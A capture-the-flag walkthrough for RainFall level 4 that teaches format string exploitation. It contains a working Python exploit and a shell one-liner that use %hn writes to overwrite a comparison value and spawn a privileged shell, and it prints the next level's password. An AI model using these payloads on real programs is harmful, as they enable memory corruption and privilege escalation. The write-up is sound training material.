# Level 4 - RainFall CTF Walkthrough

## Challenge Overview
Level 4 is a **format string vulnerability** challenge. Think of it like this: imagine a program that's supposed to print "Hello [your name]" but instead of safely inserting your name, it lets you control the entire printing process - including writing to memory! This is exactly what we'll exploit.

**Simple Goal**: Trick the program into calling `system("/bin/sh")` to give us a shell with higher privileges.

## What You'll Learn
- How format strings work and why they're dangerous
- How to read assembly code to understand program flow
- How to write to memory using format string bugs
- Precise exploitation techniques requiring exact calculations

---

## Step 1: Understanding the Program

### What does the program do?
Let's look at the program structure:

```bash
level4@RainFall:~$ gdb -q level4
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

The program has this flow:
```
main() → calls n() → calls p() → vulnerable printf()
```

### The Critical Parts (Simplified)

**Function `p()` - The Vulnerable Function:**
```assembly
p:
  ; ... setup code ...
  call   fgets@plt            ; reads YOUR input into a buffer
  ; ... more code ...
  call   printf@plt           ; printf(your_input) ← THE BUG!
```

**🚨 The Bug:** The program does `printf(your_input)` instead of `printf("%s", your_input)`. This means YOU control the format string!

**Function `n()` - The Target Check:**
```assembly
n:
  ; ... calls p() ...
  cmp    $0x1025544,%eax      ; compares a memory value with 16930116
  jne    0x80484a5            ; if NOT equal, exit
  ; if EQUAL:
  call   system@plt           ; system("/bin/sh") ← OUR GOAL!
```

**🎯 Our Mission:** Make the memory location contain the value `0x1025544` (16,930,116 in decimal).

---

## Step 2: Format String Vulnerabilities Explained

### What are Format Strings?
Format strings are those `%` things in printf:
- `printf("Hello %s", name)` - `%s` prints a string
- `printf("Number: %d", 42)` - `%d` prints a number
- `printf("Hex: %x", 255)` - `%x` prints in hexadecimal

### The Dangerous Ones
- `%x` - Reads and prints values from the stack
- `%n` - Writes the number of characters printed so far to a memory address
- `%hn` - Like `%n` but writes only 2 bytes instead of 4

### Why This is Dangerous
When you do `printf(user_input)`, the user can inject format specifiers:
- Input: `"AAAA%x%x%x"` → Prints your AAAA + 3 values from the stack
- Input: `"AAAA%n"` → Tries to write the number 4 to wherever the stack points

---

## Step 3: Finding Our Target

### What Memory Address to Attack?
We need to find where the program stores the value it compares with `0x1025544`.

```bash
(gdb) disassemble n
# Look for: cmp $0x1025544,%eax
# This tells us the program loads a value from memory and compares it
```

Through analysis (checking cross-references, looking at data sections), we find the target address is: **`0x8049810`**

### Verification
```bash
(gdb) x/x 0x8049810
0x8049810:  0x00000000    # Currently 0, we need to make it 0x1025544
```

---

## Step 4: Discovering Stack Layout

### Finding Where Our Input Appears
We need to know where our input lands on the printf argument stack:

```bash
level4@RainFall:~$ echo "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" | ./level4
AAAA200.b7fd1ac0.b7ff37d0.41414141...
```

See that `41414141`? That's our "AAAA" in hex! It appears at position 12.

**Easier test:**
```bash
level4@RainFall:~$ echo "AAAA%12\$x" | ./level4
AAAA41414141
```
Perfect! Position 12 is where our input starts.

---

## Step 5: The Exploitation Plan

### Our Strategy: Two-Part Write
We need to write `0x01025544` to address `0x8049810`. This is a 4-byte (32-bit) value, but `%hn` only writes 2 bytes at a time. So we'll split it:

**Target:** `0x01025544`
- **Low 2 bytes:** `0x5544` = `21828` in decimal
- **High 2 bytes:** `0x0102` = `258` in decimal

**Memory Layout:**
- Address `0x8049810`: Will get `0x5544` (low bytes)
- Address `0x8049812`: Will get `0x0102` (high bytes)
- Combined: `0x01025544` ✅

### How %hn Works
`%hn` writes the total number of characters printed so far to a memory address. For example:
- If printf has printed 100 characters, `%hn` writes 100 to memory
- If printf has printed 21828 characters, `%hn` writes 21828 to memory

**But there's a catch!** `%hn` only writes 2 bytes, so it works modulo 65536:
- If 70000 characters printed, `%hn` writes `70000 % 65536 = 4464`

---

## Step 6: Calculating the Exploit

### Our Payload Structure
```
[addr_low][addr_high][padding1]%12$hn[padding2]%13$hn
    ↑         ↑          ↑        ↑       ↑       ↑
    │         │          │        │       │       └─ Write high bytes
    │         │          │        │       └───────── More padding
    │         │          │        └─────────────────── Write low bytes
    │         │          └──────────────────────────── Padding to reach 21828
    │         └─────────────────────────────────────── Target addr + 2
    └───────────────────────────────────────────────── Target address
```

### The Math
1. **Addresses take space:** 8 bytes printed (two 4-byte addresses)
2. **First write (low bytes):**
   - Need total: 21828 characters printed
   - Already have: 8 characters
   - Need: `21828 - 8 = 21820` more characters
   - Use: `%21820x` (prints a number with 21820 characters width)
3. **Second write (high bytes):**
   - After first write: 21828 characters total
   - Need for high bytes: 258 characters printed (mod 65536)
   - But we're already at 21828, so we need: `258 + 65536 = 65794` total
   - Additional needed: `65794 - 21828 = 43966` characters
   - Use: `%43966x`

---

## Step 7: Building the Exploit

### Python Script Explanation
```python
import struct
import sys

# Target memory address where we want to write 0x01025544
addr = 0x08049810

# Create the addresses in little-endian format (Intel x86)
addr_low  = struct.pack("<I", addr)       # 0x08049810 → \x10\x98\x04\x08
addr_high = struct.pack("<I", addr + 2)   # 0x08049812 → \x12\x98\x04\x08

# Padding calculations (explained above)
pad1 = 21820   # To reach 21828 total (for low bytes)
pad2 = 43966   # To reach 65794 total (for high bytes)

# Build the payload
payload = addr_low + addr_high              # Put addresses first
payload += ("%%%dx" % pad1).encode()       # %21820x - print 21820 chars
payload += b"%12$hn"                       # Write to position 12 (our addr_low)
payload += ("%%%dx" % pad2).encode()       # %43966x - print 43966 more chars
payload += b"%13$hn"                       # Write to position 13 (our addr_high)

# Output the payload
sys.stdout.buffer.write(payload)
```

### Why This Works
1. **Addresses placed:** Stack positions 12 and 13 now point to our target addresses
2. **First `%21820x`:** Prints 21820 characters (total now 21828)
3. **First `%12$hn`:** Writes 21828 to address `0x8049810` (but only low 2 bytes: `0x5544`)
4. **Second `%43966x`:** Prints 43966 more characters (total now 65794)
5. **Second `%13$hn`:** Writes 65794 % 65536 = 258 to address `0x8049812` (as `0x0102`)
6. **Result:** Memory at `0x8049810` contains `0x01025544` ✅

---

## Step 8: Running the Exploit

```bash
( python -c 'import struct,sys;addr=0x8049810;p1=struct.pack("<I",addr);p2=struct.pack("<I",addr+2);pad1=21820;pad2=43966;payload=p1+p2+("%%%dx" % pad1)+("%12$hn")+("%%%dx" % pad2)+("%13$hn");sys.stdout.write(payload)' ; cat ) | ./level4
```

---

## Step 9: Success and Password Retrieval

If everything works correctly:

```bash
$ whoami
level5

$ cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---

## Debugging Tips

### If the Exploit Doesn't Work:

1. **Check Stack Offset:**
   ```bash
   echo "BBBB%12\$x" | ./level4
   # Should see 42424242, if not, try different positions
   ```

2. **Verify Target Address:**
   ```bash
   (gdb) x/x 0x8049810
   # Should show the memory location exists
   ```

3. **Test Memory Write:**
   ```bash
   # Simple test - try to write small value
   echo -e "\x10\x98\x04\x08%12\$n" | ./level4
   ```

4. **Check Character Counts:**
   - Use a calculator to verify your padding math
   - Remember: addresses = 8 chars, then add your padding

### Common Issues:
- **Wrong stack positions:** Use `%x` repeatedly to find where your input appears
- **Address format:** Make sure you're using little-endian (`struct.pack("<I", addr)`)
- **Character count errors:** Double-check your arithmetic
- **Shell doesn't stay open:** Always pipe `cat` after your exploit

---

## Understanding the Attack (Summary)

This attack chain works because:

1. **Format String Bug:** `printf(user_input)` lets us control format specifiers
2. **Memory Write:** `%n` and `%hn` can write to arbitrary memory addresses
3. **Stack Control:** We place target addresses on the stack via our input
4. **Precise Counting:** By controlling printed character count, we control written values
5. **Condition Bypass:** Writing the correct value makes the comparison succeed
6. **Privilege Escalation:** Success triggers `system("/bin/sh")`

## Key Learning Points

1. **Input Validation Matters:** Never pass user input directly to printf
2. **Format Strings are Powerful:** They can read from and write to memory
3. **Precision is Critical:** Exploitation requires exact calculations
4. **Assembly Reading:** Understanding disassembly helps find attack targets
5. **Memory Layout:** Knowing how data is stored helps craft exploits

## Password for Level 5
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Commands Cheatsheet
```bash
# Analysis
gdb -q level4
(gdb) disassemble main
echo "AAAA%12\$x" | ./level4

# Find stack position
python3 -c "print('AAAA' + '.%x' * 20)" | ./level4

# Exploit
(python3 exploit.py; cat) | ./level4

# Get password
cat /home/user/level5/.pass
```

---
**Next Level**: Use the obtained password to access Level 5 and continue the CTF challenge.

---

## Bonus: Format String Reference

| Specifier | Purpose | Example |
|-----------|---------|---------|
| `%s` | Print string | `printf("%s", "hello")` |
| `%d` | Print integer | `printf("%d", 42)` |
| `%x` | Print hex | `printf("%x", 255)` → `ff` |
| `%n` | Write count to address | Dangerous! |
| `%hn` | Write 2-byte count | Even more precise |
| `%12$x` | Access 12th argument | Position specifier |

**Remember:** In secure code, always use `printf("%s", user_input)` instead of `printf(user_input)`!